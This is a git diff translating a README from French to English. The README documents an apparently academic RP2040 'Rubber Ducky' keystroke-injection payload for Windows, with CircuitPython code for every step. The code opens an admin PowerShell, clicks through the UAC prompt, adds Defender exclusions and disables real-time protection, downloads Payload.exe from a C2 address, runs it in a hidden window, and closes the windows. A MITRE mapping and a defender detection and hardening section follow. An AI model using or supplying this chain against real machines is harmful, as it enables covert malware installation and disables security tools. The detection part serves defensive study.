@@ -1,48 +1,53 @@
+
 # 🦆 Rubber Ducky — HID Injection Payload (CircuitPython / RP2040)
 
-## 📋 Description
-
-Ce script CircuitPython transforme une carte **RP2040** (format clé USB) en périphérique **HID Keyboard**. Une fois branché sur une machine cible Windows, il exécute automatiquement une séquence de frappes clavier simulant un utilisateur humain, en moins de **5 secondes**.
-
-La chaîne d'exécution complète :
-1. Ouvre une invite CMD via `Win+R`
-2. Lance PowerShell avec privilèges administrateur
-3. Valide automatiquement l'UAC
-4. Crée un dossier dédié et l'ajoute aux exclusions Windows Defender
-5. Télécharge un payload distant depuis le serveur C2
-6. L'exécute en mode furtif (`-WindowStyle Hidden`)
-7. Ferme toutes les fenêtres ouvertes
+> ⚠️ **LEGAL DISCLAIMER** — This code was developed as part of an academic project at **ESGI Paris (2025-2026)**. All tests were conducted on machines we own, in an isolated lab environment. Any use on third-party systems without explicit authorization is illegal (French Penal Code article 323-1 / CFAA in the US). This repository is published for **educational and offensive security research purposes only**.
 
 ---
 
-## 🔧 Prérequis matériel & logiciel
+## 📋 Overview
 
-### Matériel
-| Composant | Détails |
+This CircuitPython script turns an **RP2040** board (USB stick form factor) into a **HID Keyboard** device. Once plugged into a Windows target machine, it automatically executes a sequence of keystrokes simulating a human user — in under **5 seconds**.
+
+Full execution chain:
+1. Opens a CMD prompt via `Win+R`
+2. Launches PowerShell with administrator privileges
+3. Automatically confirms the UAC prompt
+4. Creates a dedicated folder and adds it to Windows Defender exclusions
+5. Downloads a remote payload from the C2 server
+6. Executes it silently (`-WindowStyle Hidden`)
+7. Closes all open windows
+
+---
+
+## 🔧 Hardware & Software Requirements
+
+### Hardware
+| Component | Details |
 |---|---|
-| Carte | **RP2040 USB** (format clé USB standard) |
-| OS cible | Windows 10 / 11 (disposition clavier FR) |
-| Connexion | Port USB-A direct |
+| Board | **RP2040 USB** (standard USB stick form factor) |
+| Target OS | Windows 10 / 11 (FR keyboard layout) |
+| Connection | Direct USB-A port |
 
-### Dépendances CircuitPython
+### CircuitPython Dependencies
 ```
 circuitpython >= 8.x
 adafruit_hid >= 6.0.0
   ├── adafruit_hid/keyboard.py
-  ├── adafruit_hid/keycode_win_fr.py          ← layout AZERTY Windows FR
+  ├── adafruit_hid/keycode_win_fr.py          ← AZERTY Windows FR layout
   └── adafruit_hid/keyboard_layout_win_fr.py
 ```
 
-> Toutes les librairies sont disponibles sur le [Bundle Adafruit CircuitPython](https://github.com/adafruit/Adafruit_CircuitPython_Bundle). Copier le dossier `adafruit_hid/` dans le répertoire `/lib` du périphérique.
+> All libraries are available on the [Adafruit CircuitPython Bundle](https://github.com/adafruit/Adafruit_CircuitPython_Bundle). Copy the `adafruit_hid/` folder into the `/lib` directory of the device.
 
 ---
 
-## 📁 Structure du périphérique
+## 📁 Device File Structure
 
 ```
 CIRCUITPY (D:\)
 │
-├── code.py                  ← Ce fichier (point d'entrée automatique)
+├── code.py                  ← This file (auto entry point)
 │
 └── lib/
     └── adafruit_hid/
@@ -52,44 +57,44 @@ CIRCUITPY (D:\)
         └── keycode_win_fr.mpy
 ```
 
-> CircuitPython exécute automatiquement `code.py` à chaque branchement du périphérique.
+> CircuitPython automatically executes `code.py` every time the device is plugged in.
 
 ---
 
-## 🔬 Analyse technique du code
+## 🔬 Code Breakdown
 
-### Initialisation HID
+### HID Initialization
 
 ```python
 kbd = Keyboard(usb_hid.devices)
 layout = KeyboardLayout(kbd)
-time.sleep(2)              # Attente de la reconnaissance HID par l'OS
+time.sleep(2)              # Wait for the OS to recognize the HID device
 ```
 
-Le délai de 2 secondes est critique : il laisse le temps au système d'exploitation de reconnaître et d'initialiser le périphérique comme clavier légitime avant d'envoyer les premières frappes.
+The 2-second delay is critical: it gives the OS enough time to recognize and initialize the board as a legitimate keyboard before sending the first keystrokes.
 
 ---
 
-### Étape 1 — Ouverture CMD via Win+R
+### Step 1 — Open CMD via Win+R
 
 ```python
 def win_run(command, delay=0.5):
-    kbd.press(Keycode.GUI, Keycode.R)   # Raccourci Win+R → boîte Exécuter
+    kbd.press(Keycode.GUI, Keycode.R)   # Win+R shortcut → Run dialog
     kbd.release_all()
     time.sleep(delay)
-    layout.write(command)               # Saisit la commande caractère par caractère
+    layout.write(command)               # Types the command character by character
     kbd.press(Keycode.ENTER)
     kbd.release_all()
 
 win_run("cmd", delay=0.6)
-time.sleep(1.5)                         # Attente de l'ouverture de la fenêtre CMD
+time.sleep(1.5)                         # Wait for the CMD window to fully open
 ```
 
-**Pourquoi `delay=0.6` ?** Un délai trop court ne laisse pas le temps à la boîte `Exécuter` de s'ouvrir sur des machines plus lentes.
+**Why `delay=0.6`?** A shorter delay doesn't give the Run dialog enough time to open on slower machines, causing keystrokes to be missed.
 
 ---
 
-### Étape 2 — Élévation PowerShell (UAC Bypass)
+### Step 2 — PowerShell Elevation (UAC Bypass)
 
 ```python
 layout.write('powershell -Command "Start-Process powershell -Verb RunAs"')
@@ -97,7 +102,7 @@ kbd.press(Keycode.ENTER)
 kbd.release_all()
 time.sleep(1)
 
-# Navigation dans la fenêtre UAC : flèche gauche sélectionne "Oui"
+# UAC dialog navigation: LEFT_ARROW selects "Yes"
 kbd.press(Keycode.LEFT_ARROW)
 kbd.release_all()
 time.sleep(0.3)
@@ -105,128 +110,127 @@ kbd.press(Keycode.ENTER)
 kbd.release_all()
 ```
 
-`-Verb RunAs` déclenche une élévation UAC. La validation est automatisée via une pression de touche : sur la boîte UAC Windows, `←` suivi de `Entrée` confirme l'élévation.
+`-Verb RunAs` triggers a UAC elevation prompt. The confirmation is automated via keystroke: on the Windows UAC dialog, `←` followed by `Enter` selects and confirms "Yes".
 
-> **Technique MITRE :** T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control
+> **MITRE Technique:** T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control
 
 ---
 
-### Étape 3 — Préparation de l'environnement
+### Step 3 — Environment Setup
 
 ```python
-layout.write("cd c:\\")         # Naviguer à la racine C:\
-layout.write("mkdir games")     # Créer C:\games (nom discret)
-layout.write("cd games")        # Se positionner dans le dossier
+layout.write("cd c:\\")         # Navigate to C:\ root
+layout.write("mkdir games")     # Create C:\games (inconspicuous name)
+layout.write("cd games")        # Move into the folder
 ```
 
-Le dossier `C:\games` est choisi pour son apparence anodine aux yeux d'un utilisateur non averti.
+The folder `C:\games` was chosen for its harmless appearance to an unsuspecting user browsing the filesystem.
 
 ---
 
-### Étape 4 — Désactivation Windows Defender
+### Step 4 — Disabling Windows Defender
 
 ```python
-# Ajouter le dossier aux exclusions AV
+# Add the folder to AV exclusions
 layout.write('Add-MpPreference -ExclusionPath "C:\\games"')
 
-# Exclure le processus du payload
+# Exclude the payload process from scanning
 layout.write('Add-MpPreference -ExclusionProcess "Payload.exe"')
 
-# Désactiver la protection en temps réel
+# Disable real-time protection
 layout.write('Set-MpPreference -DisableRealtimeMonitoring $true')
 ```
 
-Ces trois commandes sont exécutées **avant** le téléchargement du payload pour éviter sa suppression automatique par Defender.
+These three commands run **before** the payload is downloaded to prevent Defender from automatically quarantining or blocking it on arrival.
 
-> **Technique MITRE :** T1562.001 — Impair Defenses: Disable or Modify Tools
+> **MITRE Technique:** T1562.001 — Impair Defenses: Disable or Modify Tools
 
 ---
 
-### Étape 5 — Téléchargement & exécution du payload
+### Step 5 — Payload Download & Execution
 
 ```python
-# Téléchargement via alias wget (alias de Invoke-WebRequest dans PowerShell)
+# Download via wget (PowerShell alias for Invoke-WebRequest)
 layout.write("wget http://IP_OF_C2/Payload.exe -O Payload.exe")
 
-# Exécution en arrière-plan, fenêtre cachée
+# Execute silently in the background
 layout.write('Start-Process "C:\\games\\Payload.exe" -WindowStyle Hidden')
 ```
 
-`-WindowStyle Hidden` empêche l'apparition d'une fenêtre visible par l'utilisateur. Le payload se connecte ensuite au serveur C2 Mythic.
+`-WindowStyle Hidden` prevents any visible window from appearing for the user. The payload then establishes a connection back to the Mythic C2 server.
 
-> **Techniques MITRE :** T1105 (Ingress Tool Transfer) + T1036 (Masquerading)
+> **MITRE Techniques:** T1105 (Ingress Tool Transfer) + T1036 (Masquerading)
 
 ---
 
-### Étape 6 — Nettoyage des traces visuelles
+### Step 6 — Cleanup
 
 ```python
-layout.write("exit")    # Ferme PowerShell admin
-layout.write("exit")    # Ferme CMD
+layout.write("exit")    # Close admin PowerShell
+layout.write("exit")    # Close CMD
 ```
 
-Toutes les fenêtres ouvertes pendant l'attaque sont fermées. Sur une machine sans utilisateur présent, l'attaque est indétectable à l'œil nu.
+All windows opened during the attack are closed. On an unattended machine, the entire operation leaves no visible trace.
 
 ---
 
-## ⏱️ Timeline d'exécution
+## ⏱️ Execution Timeline
 
 ```
-T+0.0s  → Branchement USB, reconnaissance HID
-T+2.0s  → Début de l'exécution du script
-T+2.6s  → Win+R → "cmd" → Entrée
-T+4.1s  → Lancement PowerShell admin
-T+5.1s  → Validation UAC automatique
-T+6.1s  → Création dossier C:\games
-T+7.6s  → Exclusions Defender ajoutées + RT Monitoring désactivé
-T+9.6s  → Téléchargement Payload.exe
-T+10.6s → Exécution Payload.exe (mode hidden)
-T+11.6s → Fermeture des fenêtres
+T+0.0s  → USB plug-in, HID recognition by the OS
+T+2.0s  → Script execution starts
+T+2.6s  → Win+R → "cmd" → Enter
+T+4.1s  → Admin PowerShell launch
+T+5.1s  → Automatic UAC confirmation
+T+6.1s  → C:\games folder created
+T+7.6s  → Defender exclusions added + real-time monitoring disabled
+T+9.6s  → Payload.exe downloaded
+T+10.6s → Payload.exe executed (hidden window)
+T+11.6s → All windows closed
 ```
 
-**Temps total d'exécution visible : ~10 secondes**
+**Total visible execution time: ~10 seconds**
 
 ---
 
-## 🗺️ Mapping MITRE ATT&CK
+## 🗺️ MITRE ATT&CK Mapping
 
-| Étape | Technique | ID |
+| Step | Technique | ID |
 |---|---|---|
-| Reconnaissance HID | Hardware Additions | T1200 |
-| Ouverture CMD/PowerShell | Command and Scripting Interpreter: PowerShell | T1059.001 |
-| Validation UAC automatique | Abuse Elevation Control Mechanism | T1548.002 |
-| Exclusion Defender | Impair Defenses: Disable or Modify Tools | T1562.001 |
-| Téléchargement payload | Ingress Tool Transfer | T1105 |
-| Exécution cachée | Hide Artifacts: Hidden Window | T1564.003 |
-| Fermeture fenêtres | Obfuscated Files or Information | T1027 |
+| HID recognition | Hardware Additions | T1200 |
+| CMD / PowerShell launch | Command and Scripting Interpreter: PowerShell | T1059.001 |
+| Automatic UAC confirmation | Abuse Elevation Control Mechanism | T1548.002 |
+| Defender exclusion | Impair Defenses: Disable or Modify Tools | T1562.001 |
+| Payload download | Ingress Tool Transfer | T1105 |
+| Hidden execution | Hide Artifacts: Hidden Window | T1564.003 |
+| Window cleanup | Obfuscated Files or Information | T1027 |
 
 ---
 
-## 🛡️ Détection (Blue Team)
+## 🛡️ Detection (Blue Team)
 
-### Règles Sigma disponibles
-Voir le dossier [`../detection/sigma_rules/`](../detection/sigma_rules/) pour les règles de détection associées à ce script.
+### Sigma Rules
+See the [`../detection/sigma_rules/`](../detection/sigma_rules/) folder for detection rules mapped to each technique used in this script.
 
-### Signaux d'alerte à monitorer
+### Key Detection Signals
 
-| Signal | Outil de détection |
+| Signal | Detection Tool |
 |---|---|
-| Périphérique HID inconnu branché | Sysmon Event ID 6416 |
-| `powershell.exe` enfant de `cmd.exe` avec `-Verb RunAs` | Sysmon Event ID 1 |
-| `Add-MpPreference -ExclusionPath` en ligne de commande | Windows Defender Event ID 5007 |
+| Unknown HID device plugged in | Sysmon Event ID 6416 |
+| `powershell.exe` child of `cmd.exe` with `-Verb RunAs` | Sysmon Event ID 1 |
+| `Add-MpPreference -ExclusionPath` in command line | Windows Defender Event ID 5007 |
 | `Set-MpPreference -DisableRealtimeMonitoring $true` | Windows Defender Event ID 5001 |
-| Connexion réseau depuis `%TEMP%` ou `C:\games\` | Sysmon Event ID 3 |
-| `wget` (alias `Invoke-WebRequest`) vers IP publique inconnue | Proxy / NGFW logs |
+| Network connection initiated from `%TEMP%` or `C:\games\` | Sysmon Event ID 3 |
+| `wget` / `Invoke-WebRequest` to unknown public IP | Proxy / NGFW logs |
 
-### Mesures de durcissement recommandées
-- **Whitelister les périphériques HID** autorisés via GPO (Device Installation Restrictions)
-- **Activer Tamper Protection** dans Windows Defender (empêche la modification via PowerShell)
-- **Monitorer les Event ID 5001/5007** de Windows Defender dans le SIEM
-- **Restreindre l'accès USB** sur les postes sensibles (BIOS + politique organisationnelle)
-
----
-
+### Hardening Recommendations
+- **Whitelist authorized HID devices** via GPO (Device Installation Restrictions)
+- **Enable Tamper Protection** in Windows Defender to prevent modification via PowerShell
+- **Monitor Event IDs 5001/5007** from Windows Defender in your SIEM
+- **Restrict USB access** on sensitive workstations (BIOS policy + organizational policy)
 
 ---
 
-*Projet annuel 5e année — ESGI Paris 2025-2026 | Abdou DEMBELE & Flabou DIAKITE*
+Sortie
+
+exit code 0
